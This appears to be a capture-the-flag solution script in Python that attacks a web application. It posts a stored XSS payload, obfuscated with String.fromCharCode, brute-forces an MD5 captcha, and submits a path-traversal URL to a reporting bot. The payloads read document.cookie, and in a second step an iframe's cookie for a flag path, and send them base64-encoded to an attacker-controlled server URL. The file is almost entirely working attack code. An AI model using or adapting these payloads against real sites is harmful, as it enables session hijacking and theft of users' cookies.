#/usr/bin/env python3
# coding:utf-8

import requests as req
import re
import md5

url = "http://39.107.33.96:20000/index.php"
headers = {}


def md5x(str):
    m1 = md5.new()
    m1.update(str)
    return m1.hexdigest()


def run_md5(arg):
    code = arg
    start = 10000000
    end = 100000000
    if not code:
        return False
    print('[+] Runing...')
    while start <= end:
        res = md5x(str(start))[:len(code)]
        if res == code:
            print('[+] Runing md5 successfully \'%s\'...' % start)
            return start
        start += 1
    return 0


def add(title, content):
    res = req.post(
        url + '/add/', data={"title": title, "content": content}, headers=headers, allow_redirects=False)
    if res.status_code == 302:
        print("[+] Add article successfully")
        return 1
    else:
        print("[-] Add article error")
        return 0


def view():
    res = req.get(url + '/view/', headers=headers)
    if res.status_code == 200:
        html = res.content
        m = re.findall(r'/index\.php/view/article/(\d+)', html)
        if m:
            print("[+] Get article id '%s'" % m[0])
            return m[0]
        else:
            print("[-] Get article error")
    else:
        print("[-] Get view error")
    return 0


def test(u):
    res = req.get(u, headers=headers)
    if res.status_code == 200:
        print("[+] Test view successfully")
        print("[*] *************************************")
        print(res.content + '\n')
        print("[*] *************************************")
        return 1
    else:
        print("[-] Test view article error")
        return 0


def report(_url):
    res = req.get(url + '/report/', headers=headers)
    if res.status_code == 200:
        html = res.content
        code = re.findall(
            r'\(\$code\),0,6\) === \'(.*?)\'', html)
        if code:
            code = run_md5(code[0])
        if code:
            res = req.post(
                url + '/report/', data={"url": _url, "code": code}, headers=headers, allow_redirects=False)
            if res.status_code == 200 and 'Submit success' in res.content:
                print("[+] Report successfully")
            else:
                print("[-] Report error")
                print(res.content)
        else:
            print("[-] Run md5 code error")
    else:
        print("[-] Get md5 code error")


def fuck(playload):
    r = add('', playload)
    if r:
        _id = view()
    _u = url + '/view/article/%s' % _id
    if test(_u):
        print("[!] It can fuck?")
        report(url + '/view/article/%s/..%%2f..%%2f/' % _id)


def encode(pl):
    res = []
    template = "eval(String.fromCharCode({}));"
    for i in pl.strip():
        res.append(str(ord(i)))
    return template.format(','.join(res))

if __name__ == '__main__':
    """
    Before use this, U should logined and type the cookie for auth
    """
    VPSURL = "http://xxx/?x="
    headers = {
        "Cookie": "PHPSESSID=xxxxxxxxxxx"
    }
    #
    # step 1 =====================
    #
    p1 = """
var s=window.document.createElement("img");
s.src="%s"+btoa(document.cookie);
window.document.body.appendChild(s);
    """ % VPSURL
    fuck(encode(p1))
    #
    # step 2 =====================
    # HINT=Try to get the cookie of path "/QWB_fl4g/QWB/"
    # http://39.107.33.96:20000/QWB_fl4g/QWB/
    #
    p2 = """
var d=document,b=d.body,x=d.createElement("iframe"),s=d.createElement("img");
x.setAttribute("src","/QWB_fl4g/QWB/");
x.onload=function(){setTimeout(function(){s.src=%s+btoa(x.contentDocument.cookie);b.appendChild(s)},0)};
b.appendChild(x);
    """ % VPSURL
    fuck(encode(p2))
